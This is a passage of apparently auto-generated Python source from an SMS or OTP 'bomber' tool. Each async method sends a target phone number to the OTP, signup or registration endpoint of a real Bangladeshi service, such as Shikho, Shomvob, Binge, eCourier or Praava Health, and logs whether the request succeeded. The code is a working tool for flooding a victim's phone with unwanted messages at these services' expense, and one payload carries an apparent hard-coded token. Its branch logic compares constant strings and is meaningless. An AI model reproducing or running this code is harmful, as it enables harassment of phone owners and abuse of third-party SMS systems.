            elif "Kirei" in "CURL015 frontendapi.kireibd.com": payload = {"phone": target}
            elif "Shikho" in "CURL015 frontendapi.kireibd.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL015 frontendapi.kireibd.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL015 frontendapi.kireibd.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL015 frontendapi.kireibd.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL015 frontendapi.kireibd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl016_api_shikho_com(self):
        target = self.target
        url = "https://api.shikho.com/auth/v2/send/sms"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL016 api.shikho.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL016 api.shikho.com": pass
            elif "Bioscope" in "CURL016 api.shikho.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL016 api.shikho.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL016 api.shikho.com": payload = {"phone": target}
            elif "Medha" in "CURL016 api.shikho.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL016 api.shikho.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL016 api.shikho.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL016 api.shikho.com": payload = {"mobile": target}
            elif "MyGP" in "CURL016 api.shikho.com": pass
            elif "BDSTall" in "CURL016 api.shikho.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL016 api.shikho.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL016 api.shikho.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL016 api.shikho.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL016 api.shikho.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL016 api.shikho.com": payload = {"mobile": target}
            elif "Kirei" in "CURL016 api.shikho.com": payload = {"phone": target}
            elif "Shikho" in "CURL016 api.shikho.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL016 api.shikho.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL016 api.shikho.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL016 api.shikho.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL016 api.shikho.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl017_backend_api_shomvob_co(self):
        target = self.target
        url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL017 backend-api.shomvob.co": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL017 backend-api.shomvob.co": pass
            elif "Bioscope" in "CURL017 backend-api.shomvob.co": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL017 backend-api.shomvob.co": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL017 backend-api.shomvob.co": payload = {"phone": target}
            elif "Medha" in "CURL017 backend-api.shomvob.co": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL017 backend-api.shomvob.co": payload = {"number": "+88" + target}
            elif "Robi" in "CURL017 backend-api.shomvob.co": payload = {"phone_number": target}
            elif "Arogga" in "CURL017 backend-api.shomvob.co": payload = {"mobile": target}
            elif "MyGP" in "CURL017 backend-api.shomvob.co": pass
            elif "BDSTall" in "CURL017 backend-api.shomvob.co": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL017 backend-api.shomvob.co": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL017 backend-api.shomvob.co": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL017 backend-api.shomvob.co": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL017 backend-api.shomvob.co": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL017 backend-api.shomvob.co": payload = {"mobile": target}
            elif "Kirei" in "CURL017 backend-api.shomvob.co": payload = {"phone": target}
            elif "Shikho" in "CURL017 backend-api.shomvob.co": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL017 backend-api.shomvob.co": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL017 backend-api.shomvob.co", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL017 backend-api.shomvob.co", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL017 backend-api.shomvob.co", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl018_banglaflix_com_bd(self):
        target = self.target
        url = "https://banglaflix.com.bd/signin/signupsubmit"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL018 banglaflix.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL018 banglaflix.com.bd": pass
            elif "Bioscope" in "CURL018 banglaflix.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL018 banglaflix.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL018 banglaflix.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL018 banglaflix.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL018 banglaflix.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL018 banglaflix.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL018 banglaflix.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL018 banglaflix.com.bd": pass
            elif "BDSTall" in "CURL018 banglaflix.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL018 banglaflix.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL018 banglaflix.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL018 banglaflix.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL018 banglaflix.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL018 banglaflix.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL018 banglaflix.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL018 banglaflix.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL018 banglaflix.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL018 banglaflix.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL018 banglaflix.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL018 banglaflix.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl019_api_binge_buzz(self):
        target = self.target
        url = "https://api.binge.buzz/api/v4/auth/otp/send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL019 api.binge.buzz": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL019 api.binge.buzz": pass
            elif "Bioscope" in "CURL019 api.binge.buzz": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL019 api.binge.buzz": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL019 api.binge.buzz": payload = {"phone": target}
            elif "Medha" in "CURL019 api.binge.buzz": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL019 api.binge.buzz": payload = {"number": "+88" + target}
            elif "Robi" in "CURL019 api.binge.buzz": payload = {"phone_number": target}
            elif "Arogga" in "CURL019 api.binge.buzz": payload = {"mobile": target}
            elif "MyGP" in "CURL019 api.binge.buzz": pass
            elif "BDSTall" in "CURL019 api.binge.buzz": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL019 api.binge.buzz": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL019 api.binge.buzz": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL019 api.binge.buzz": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL019 api.binge.buzz": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL019 api.binge.buzz": payload = {"mobile": target}
            elif "Kirei" in "CURL019 api.binge.buzz": payload = {"phone": target}
            elif "Shikho" in "CURL019 api.binge.buzz": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL019 api.binge.buzz": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL019 api.binge.buzz", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL019 api.binge.buzz", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL019 api.binge.buzz", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl020_admin_china2bd_com_bd(self):
        target = self.target
        url = "https://admin.china2bd.com.bd/api/send-otp/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL020 admin.china2bd.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL020 admin.china2bd.com.bd": pass
            elif "Bioscope" in "CURL020 admin.china2bd.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL020 admin.china2bd.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL020 admin.china2bd.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL020 admin.china2bd.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL020 admin.china2bd.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL020 admin.china2bd.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL020 admin.china2bd.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL020 admin.china2bd.com.bd": pass
            elif "BDSTall" in "CURL020 admin.china2bd.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL020 admin.china2bd.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL020 admin.china2bd.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL020 admin.china2bd.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL020 admin.china2bd.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL020 admin.china2bd.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL020 admin.china2bd.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL020 admin.china2bd.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL020 admin.china2bd.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL020 admin.china2bd.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL020 admin.china2bd.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL020 admin.china2bd.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl021_cms_beta_praavahealth_com(self):
        target = self.target
        url = "https://cms.beta.praavahealth.com/api/v2/user/register/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL021 cms.beta.praavahealth.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL021 cms.beta.praavahealth.com": pass
            elif "Bioscope" in "CURL021 cms.beta.praavahealth.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL021 cms.beta.praavahealth.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL021 cms.beta.praavahealth.com": payload = {"phone": target}
            elif "Medha" in "CURL021 cms.beta.praavahealth.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL021 cms.beta.praavahealth.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL021 cms.beta.praavahealth.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL021 cms.beta.praavahealth.com": payload = {"mobile": target}
            elif "MyGP" in "CURL021 cms.beta.praavahealth.com": pass
            elif "BDSTall" in "CURL021 cms.beta.praavahealth.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL021 cms.beta.praavahealth.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL021 cms.beta.praavahealth.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL021 cms.beta.praavahealth.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL021 cms.beta.praavahealth.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL021 cms.beta.praavahealth.com": payload = {"mobile": target}
            elif "Kirei" in "CURL021 cms.beta.praavahealth.com": payload = {"phone": target}
            elif "Shikho" in "CURL021 cms.beta.praavahealth.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL021 cms.beta.praavahealth.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL021 cms.beta.praavahealth.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL021 cms.beta.praavahealth.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL021 cms.beta.praavahealth.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl022_coreapi_shadhinmusic_com(self):
        target = self.target
        url = "https://coreapi.shadhinmusic.com/api/v5/otp/otpreq"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL022 coreapi.shadhinmusic.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL022 coreapi.shadhinmusic.com": pass
            elif "Bioscope" in "CURL022 coreapi.shadhinmusic.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone": target}
            elif "Medha" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL022 coreapi.shadhinmusic.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL022 coreapi.shadhinmusic.com": payload = {"mobile": target}
            elif "MyGP" in "CURL022 coreapi.shadhinmusic.com": pass
            elif "BDSTall" in "CURL022 coreapi.shadhinmusic.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL022 coreapi.shadhinmusic.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL022 coreapi.shadhinmusic.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL022 coreapi.shadhinmusic.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL022 coreapi.shadhinmusic.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL022 coreapi.shadhinmusic.com": payload = {"mobile": target}
            elif "Kirei" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone": target}
            elif "Shikho" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL022 coreapi.shadhinmusic.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL022 coreapi.shadhinmusic.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL022 coreapi.shadhinmusic.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL022 coreapi.shadhinmusic.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl023_api_gateway_sundarbancourierltd_com(self):
        target = self.target
        url = "https://api-gateway.sundarbancourierltd.com/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL023 api-gateway.sundarbancourierltd.com": pass
            elif "Bioscope" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone": target}
            elif "Medha" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"mobile": target}
            elif "MyGP" in "CURL023 api-gateway.sundarbancourierltd.com": pass
            elif "BDSTall" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"mobile": target}
            elif "Kirei" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone": target}
            elif "Shikho" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL023 api-gateway.sundarbancourierltd.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL023 api-gateway.sundarbancourierltd.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL023 api-gateway.sundarbancourierltd.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL023 api-gateway.sundarbancourierltd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl024_core_easy_com_bd(self):
        target = self.target
        url = "https://core.easy.com.bd/api/v1/registration"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL024 core.easy.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL024 core.easy.com.bd": pass
            elif "Bioscope" in "CURL024 core.easy.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL024 core.easy.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL024 core.easy.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL024 core.easy.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL024 core.easy.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL024 core.easy.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL024 core.easy.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL024 core.easy.com.bd": pass
            elif "BDSTall" in "CURL024 core.easy.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL024 core.easy.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL024 core.easy.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL024 core.easy.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL024 core.easy.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL024 core.easy.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL024 core.easy.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL024 core.easy.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL024 core.easy.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL024 core.easy.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL024 core.easy.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL024 core.easy.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl025_backoffice_ecourier_com_bd(self):
        target = self.target
        url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL025 backoffice.ecourier.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL025 backoffice.ecourier.com.bd": pass
            elif "Bioscope" in "CURL025 backoffice.ecourier.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL025 backoffice.ecourier.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL025 backoffice.ecourier.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL025 backoffice.ecourier.com.bd": pass
            elif "BDSTall" in "CURL025 backoffice.ecourier.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL025 backoffice.ecourier.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL025 backoffice.ecourier.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL025 backoffice.ecourier.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL025 backoffice.ecourier.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL025 backoffice.ecourier.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL025 backoffice.ecourier.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL025 backoffice.ecourier.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL025 backoffice.ecourier.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL025 backoffice.ecourier.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl026_app_eonbazar_com(self):
        target = self.target
        url = "https://app.eonbazar.com/api/auth/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL026 app.eonbazar.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL026 app.eonbazar.com": pass
            elif "Bioscope" in "CURL026 app.eonbazar.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL026 app.eonbazar.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL026 app.eonbazar.com": payload = {"phone": target}
            elif "Medha" in "CURL026 app.eonbazar.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL026 app.eonbazar.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL026 app.eonbazar.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL026 app.eonbazar.com": payload = {"mobile": target}
            elif "MyGP" in "CURL026 app.eonbazar.com": pass
            elif "BDSTall" in "CURL026 app.eonbazar.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL026 app.eonbazar.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL026 app.eonbazar.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL026 app.eonbazar.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL026 app.eonbazar.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL026 app.eonbazar.com": payload = {"mobile": target}
            elif "Kirei" in "CURL026 app.eonbazar.com": payload = {"phone": target}
            elif "Shikho" in "CURL026 app.eonbazar.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL026 app.eonbazar.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL026 app.eonbazar.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
